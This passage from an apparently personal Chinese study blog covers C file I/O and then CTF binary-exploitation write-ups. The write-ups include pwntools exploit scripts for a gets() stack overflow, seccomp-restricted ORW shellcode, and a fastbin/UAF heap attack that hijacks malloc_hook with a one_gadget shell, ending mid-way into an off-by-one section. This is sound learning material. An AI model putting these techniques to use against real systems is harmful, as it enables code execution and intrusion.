align="left">打开一个文本文件，以追加模式写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会在已有的文件内容中追加内容。</td></tr><tr><td align="left">r+</td><td align="left">打开一个文本文件，允许读写文件。</td></tr><tr><td align="left">w+</td><td align="left">打开一个文本文件，允许读写文件。如果文件已存在，则文件会被截断为零长度，如果文件不存在，则会创建一个新文件。</td></tr><tr><td align="left">a+</td><td align="left">打开一个文本文件，允许读写文件。如果文件不存在，则会创建一个新文件。读取会从文件的开头开始，写入则只能是追加模式。</td></tr></tbody></table><p>如果处理的是二进制文件，则需使用下面的访问模式来取代上面的访问模式：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;rb&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>, <span class="hljs-string">&quot;ab&quot;</span>, <span class="hljs-string">&quot;rb+&quot;</span>, <span class="hljs-string">&quot;r+b&quot;</span>, <span class="hljs-string">&quot;wb+&quot;</span>, <span class="hljs-string">&quot;w+b&quot;</span>, <span class="hljs-string">&quot;ab+&quot;</span>, <span class="hljs-string">&quot;a+b&quot;</span><br></code></pre></td></tr></table></figure><h3 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h3><p>为了关闭文件，请使用 fclose( ) 函数。函数的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fclose</span><span class="hljs-params">( FILE *fp )</span>;<br></code></pre></td></tr></table></figure><p>如果成功关闭文件，<strong>fclose( )</strong> 函数返回零，如果关闭文件时发生错误，函数返回 <strong>EOF</strong>(定义在stdio.h中)</p><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//把参数c的字符值写入</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">fputc</span><span class="hljs-params">( <span class="hljs-type">int</span> c, FILE *fp )</span>;<br><span class="hljs-comment">//写入字符串(以null结尾)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">fputs</span><span class="hljs-params">( <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s, FILE *fp )</span>;<br><br><span class="hljs-comment">//注：fprintf也能写入，例如</span><br>fp = fopen(<span class="hljs-string">&quot;/tmp/test.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>);<br><span class="hljs-built_in">fprintf</span>(fp, <span class="hljs-string">&quot;This is testing for fprintf...\n&quot;</span>);<br></code></pre></td></tr></table></figure><p>写入成功返回非负值，失败则返回EOF。</p><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>下面是从文件读取单个字符的最简单的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fgetc</span><span class="hljs-params">( FILE * fp )</span>;<br></code></pre></td></tr></table></figure><p><strong>fgetc()</strong> 函数从 fp 所指向的输入文件中读取一个字符。返回值是读取的字符的指针，如果发生错误则返回 <strong>EOF</strong>。下面的函数允许您从流中读取一个字符串：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">fgets</span><span class="hljs-params">( <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> n, FILE *fp )</span>;<br></code></pre></td></tr></table></figure><p>函数 <strong>fgets()</strong> 从 fp 所指向的输入流中读取 n - 1 个字符。它会把读取的字符串复制到缓冲区 <strong>buf</strong>，并在最后追加一个 <strong>null</strong> 字符来终止字符串。</p><p>如果这个函数在读取最后一个字符之前就遇到一个换行符 ‘\n’ 或文件的末尾 EOF，则只会返回读取到的字符，包括换行符。您也可以使用 <strong>int fscanf(FILE *fp, const char *format, …)</strong> 函数来从文件中读取字符串，但是在遇到第一个空格和换行符时，它会停止读取。</p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fseek</span><span class="hljs-params">(FILE *fp,<span class="hljs-type">long</span> offset,<span class="hljs-type">int</span> base)</span><br><span class="hljs-comment">//使文件指针 fp 移到基于 base 的相对位置 offset 处。</span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">ftell</span><span class="hljs-params">(FILE *fp)</span> <br><span class="hljs-comment">//取得由 fp 指定文件的当前读/写位置，该位置值用相对于文件开头的位移量来表示。</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">rewind</span><span class="hljs-params">(FILE *fp)</span><br><span class="hljs-comment">//使由文件指针 fp 指定的文件的位置指针重新指向文件的开头位置。</span><br>    <br><span class="hljs-type">int</span> <span class="hljs-title function_">feof</span><span class="hljs-params">(FILE *fp)</span><br><span class="hljs-comment">//该函数用来判断文件是否结束。</span><br></code></pre></td></tr></table></figure><h2 id="day4-字符串与指针"><a href="#day4-字符串与指针" class="headerlink" title="day4 字符串与指针"></a>day4 字符串与指针</h2><p>1.使用指针计算字符串长度</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">stringLen</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span>&#123;<br>    <span class="hljs-type">int</span> L=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(*str2!=<span class="hljs-string">&#x27;\0&#x27;</span>)&#123; <span class="hljs-comment">//字符串的末尾会有 \0 作为截止符号。</span><br>        L++;<br>        str++; <br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nlength of string is:%d&quot;</span>,L);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p><a href="https://ctf-wiki.org/pwn">https://ctf-wiki.org/pwn</a></p><h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><p>首先检查程序，几乎没有保护机制。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220918214922852.png" class="" title="image-20220918214922852"><p>运行一下，发现似乎需要我们输入一个数，然后进行判断，反编译找到源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> v1[<span class="hljs-number">44</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">float</span> v2; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = <span class="hljs-number">0.0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s guess the number.&quot;</span>);<br>  gets(v1);<br>  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">11.28125</span> )<br>    result = system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Its value should be 11.28125&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>v2与11.28125进行比较，如果相等就给flag；输入则是给到了v1，下面是v1、v2在栈中的分布。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">-0000000000000030</span> var_30          db <span class="hljs-number">44</span> dup(?)<br><span class="hljs-number">-0000000000000004</span> var_4           dd ?<br>+<span class="hljs-number">0000000000000000</span>  s              db <span class="hljs-number">8</span> dup(?)<br>+<span class="hljs-number">0000000000000008</span>  r              db <span class="hljs-number">8</span> dup(?)<br></code></pre></td></tr></table></figure><p>不过v1与v2都是局部变量，运行时都在栈中，gets函数无输入长度限制会导致栈溢出，因此我们输入44字节的padding填入v1，再输入4字节的11.28125覆盖v2，即可修改v2。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#exp.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment"># p=process(&quot;./ciscn_2019_n_1&quot;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25151</span>)<br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">44</span>+p32(<span class="hljs-number">0x41348000</span>)<br>p.recvuntil(<span class="hljs-string">&quot;number.\n&quot;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220918215707990.png" class="" title="image-20220918215707990"><h3 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h3><p>整形字符溢出，当整形被强转为unsigned类型，负数会变成正数，-1会变成256</p><h3 id="pwnnable-ORW"><a href="#pwnnable-ORW" class="headerlink" title="pwnnable_ORW"></a>pwnnable_ORW</h3><p>今天学一下orw，题目源自pwnable上的orw例题pwnable_orw。</p><p>orw指open、read、write，这种题目会采用禁止大部分系统调用的方式来防止我们拿到shell，但一半会为我们保留open、read、write这三种调用，通过orw我们依然可以去读取flag。</p><blockquote><p>关于seccomp机制： <strong>seccomp</strong>相当于内核中的一种安全机制，正常情况下，程序可以使用所有的 syscall，但是当劫持程序流程之后通过 exeve 来呼叫 syscall 得到 shell 时 seccomp 边排上了用场，他可以过滤掉某些 syscall，只允许使用部分 syscall。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">//seccomp检测工具</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">sudo apt install gcc ruby-dev</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">gem install seccomp-tools</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">seccomp-tools dump ./pwn</span><br></code></pre></td></tr></table></figure></blockquote><p>检查程序发现是32位，开了canary和relro，打开ida发现首先是禁用了部分调用</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220923211102180.png" class="" title="image-20220923211102180"><p>然后就允许我们输入shellcode，然后就会直接执行shellcode处的代码:</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220923211225137.png" class="" title="image-20220923211225137"><p>很明显我们只需要构造orw写入shellcode的地址即可，第一种方式是直接使用pwntools来生成汇编代码的shellcode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>p = process(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>) <span class="hljs-comment">#打开flag的文件流</span><br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>) <span class="hljs-comment">#将返回值(eax)读到栈上(范围rsp到下方100字节)</span><br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>) <span class="hljs-comment">#将栈上的内容输出</span><br>payload = asm(shellcode)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>第二种方式就是手搓汇编</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&quot;linux&quot;</span>, arch = <span class="hljs-string">&quot;i386&quot;</span>, log_level= <span class="hljs-string">&quot;debug&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">27008</span>)<br><br>shellcode = asm(<span class="hljs-string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>, shellcode)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220923212618950.png" class="" title="image-20220923212618950"><h3 id="UAF-fastbin-attack"><a href="#UAF-fastbin-attack" class="headerlink" title="UAF+fastbin attack"></a>UAF+fastbin attack</h3><p><strong>libc-2.23</strong></p><p>一道例题，没开pie，因此我们可以直接unsortedbin泄露main_arena的地址。</p><blockquote><p>回顾一下通过unsortedbin泄露基地址的原理。</p><p>申请一个0x100大小的堆块并释放进入unsortedbin，此时unsortedbin中的fd与bk指针就泄露出来：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220922155503252.png" class="" title="image-20220922155503252"><p>而第一个堆块的fd与bk指针指向的是main_arena+88的真实地址。</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220922155437096.png" class="" title="image-20220922155437096"><p>main_arena就在malloc_hook的下方：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220922155903548.png" class="" title="image-20220922155903548"><p>因此泄露出的地址相对于libc基地址的总偏移为 ：</p><p><strong>offset &#x3D; 88(main_arena)+0x10(malloc_hook)+0x3c4b10(malloc_hook在libc中的偏移)&#x3D;0x3c4b78</strong></p></blockquote><p>泄露出地址之后就可以在malloc_hook处做好堆布局，劫持fastbin的fd指针为malloc_hook，最后申请出的堆块数据区就是malloc_hook，最后填入one_gadget即可。</p><h4 id="使用realloc调整one-gadget栈帧"><a href="#使用realloc调整one-gadget栈帧" class="headerlink" title="使用realloc调整one_gadget栈帧"></a>使用realloc调整one_gadget栈帧</h4><p>实际情况中经常会遇到one_gadget不生效的情况，原因在于one_gadget的触发是需要条件的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x45216</span>execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0x30</span>, environ)<br>constraints:<br>  rax == <span class="hljs-literal">NULL</span><br><br><span class="hljs-number">0x4526a</span>execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0x30</span>, environ)<br>constraints:<br>  [rsp+<span class="hljs-number">0x30</span>] == <span class="hljs-literal">NULL</span><br><br><span class="hljs-number">0xef6c4</span>execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0x50</span>, environ)<br>constraints:<br>  [rsp+<span class="hljs-number">0x50</span>] == <span class="hljs-literal">NULL</span><br><br><span class="hljs-number">0xf0567</span>execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, rsp+<span class="hljs-number">0x70</span>, environ)<br>constraints:<br>  [rsp+<span class="hljs-number">0x70</span>] == <span class="hljs-literal">NULL</span><br></code></pre></td></tr></table></figure><p>假设我们使用第二个0x4526a，rsp+0x30的位置必须满足为null，实际调试的时候我们会发现：</p><p>在malloc函数下断点(b malloc)并continue执行来到malloc：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220924195217238.png" class="" title="image-20220924195217238"><p>继续单步执行，直到经过realloc_hook进入do_system的前一步：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220924195849054.png" class="" title="image-20220924195849054"><p>可以看到并不满足rsp+0x30为空值的条件，但其下方有值为null的位置，那么如何能调整rsp的位置呢。</p><p>方法就是使用realloc，我们查看其汇编会发现:</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220922161703291.png" class="" title="image-20220922161703291"><p>有多次的push操作，还有下方的sub rsp,0x38会改变栈帧，那么如果我们在malloc_hook处先填入realloc，使其跳转到realloc的某条指令处(realloc在malloc上方相邻处)，就能借助例如push去调整rsp的大小，地址每增加2字节就会少一次push(等同于一次pop)，也就意味着原来的rsp+0x38等于现在的rsp+0x30，通过这种方式调整rsp的位置直到rsp+30&#x3D;null为止就可以触发one_gadget。</p><p>按上图来讲少push两次就可以满足条件，然而实际情况是少push两次之后依然不满足条件，有点玄学：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220924200120799.png" class="" title="image-20220924200120799"><p>继续尝试加，少push四次之后成功使得rsp+0x30&#x3D;NULL：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220924200754219.png" class="" title="image-20220924200754219"><p>程序继续运行后getshell：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220924200839865.png" class="" title="image-20220924200839865"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>l64     = <span class="hljs-keyword">lambda</span>                    :u64(io.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>l32     = <span class="hljs-keyword">lambda</span>                    :u32(io.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>s       = <span class="hljs-keyword">lambda</span> data               :io.send(<span class="hljs-built_in">str</span>(data))<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, <span class="hljs-built_in">str</span>(data))<br>sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(<span class="hljs-built_in">str</span>(data))<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, <span class="hljs-built_in">str</span>(data))<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :io.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, addr))<br><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)<br>io=process(<span class="hljs-string">&#x27;./heap&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./heap&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">p</span>():<br>gdb.attach(io)<br>raw_input()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br>    sla(<span class="hljs-string">&#x27;size:&#x27;</span>,size)<br>    sla(<span class="hljs-string">&#x27;content:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">2</span>)<br>sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">3</span>)<br>sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br>sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>sla(<span class="hljs-string">&#x27;4:delete\n&#x27;</span>,<span class="hljs-number">4</span>)<br>sla(<span class="hljs-string">&#x27;index:&#x27;</span>,index)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527aexecve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string"> &#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>):<br>add(i,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br><span class="hljs-comment"># p()</span><br><br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>leak=l64()<br>libc_base=leak-<span class="hljs-number">0x3c4b78</span><br>malloc=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>realloc=libc_base+libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>one_gadget=libc_base+<span class="hljs-number">0x4527a</span><br>log.success(<span class="hljs-string">&quot;malloc---&gt;%s&quot;</span>,<span class="hljs-built_in">hex</span>(malloc))<br><br><span class="hljs-comment"># p()</span><br>target=malloc-<span class="hljs-number">0x23</span><br><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">1</span>,p64(target))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<br><span class="hljs-comment"># p()</span><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x13</span>-<span class="hljs-number">8</span>)+p64(one_gadget)+p64(realloc+<span class="hljs-number">8</span>))<br><span class="hljs-comment">#padding + og(-&gt;realloc_hook) + realloc(-&gt;malloc_hook) </span><br><br><span class="hljs-comment"># add(6,0x20,&#x27;/bin/sh&#x27;)</span><br>io.recvuntil(<span class="hljs-string">&#x27;delete\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;index:\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;6&#x27;</span>)<br>gdb.attach(io,<span class="hljs-string">&quot;b malloc&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;size:\n&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;32&#x27;</span>)<br>io.interactive()<br><br><br></code></pre></td></tr></table></figure><h4 id="遇到的坑点"><a href="#遇到的坑点" class="headerlink" title="遇到的坑点"></a>遇到的坑点</h4><p>还是太久没碰了，导致很多细节遗忘掉了 &#x3D;-&#x3D; 。</p><p>1.libc要用系统自带的(&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so)，因为pwntools使用的默认libc就是系统自带的,否则的话偏移会有差异导致程序异常中断，包括one_gadget的偏移也有差异。</p><p>2.最后一步add如果出现中断可以拆分执行，例如add可能只需要index和size，并不需要content，因此使用原先的可能会recv异常导致报错中断。</p><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h3><p><strong>libc-2.23</strong></p><p>传统菜单题，没开pie和RELRO；增删改查功能都有，限制添加20个堆块，add的大小没有限制，free清空了堆块指针，不存在悬挂。</p><p>注意edit处：</p><img src="/2022/09/21/%E6%AF%8F%E6%97%A5C/image-20220925211712852.png" class="" title="image-20220925211712852"><p>v2是我们在add的时候输入的size，但read(0,size,buf)会导致我们可以多输入一个字节，正确的写法应当是read(0,size-1,buf)，因此这里有off by one可以利用，下面开始堆布局。</p><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>首先申请四个堆块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 